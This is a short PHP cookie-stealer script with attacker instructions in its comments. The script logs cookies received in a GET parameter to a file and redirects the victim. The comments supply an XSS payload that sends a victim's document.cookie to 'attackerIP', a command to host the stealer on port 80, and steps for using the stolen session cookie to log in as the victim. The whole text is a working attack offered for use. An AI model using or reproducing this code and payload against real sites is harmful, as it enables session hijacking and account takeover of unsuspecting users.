<?php
// Choose a domain on the same website or something the browser can resolve.
header ('Location:https://domain.com');
		$cookies = $_GET["c"];
		$file = fopen('log.txt', 'a');
		fwrite($file, $cookies . "\n\n");

?>

// Use the below XSS to execute javascript on the victims browser and send him to your website hosting the cookiestealer. 
# <script type="text/javascript">
# document.location='http://attackerIP/cookiestealer.php?c='+document.cookie;
# </script>

// Command to fire up a simple php site using port 80
// php -S 0.0.0.0:80

// When you're finished - Go disable javascript in about:config. Search "javascript. enabled" in the search bar and toggle it. 
// Reload and put in your sessions cookie into "Storage" - Add item and name should be "session" and value is the cookie you've stolen from the victim. Reload page and you should be logged in.
// Example of return from cookiestealer.php ->  GET /cookiestealer.php?c=session=7b3f23f75a8e5e7aa58b8092f25a91d5
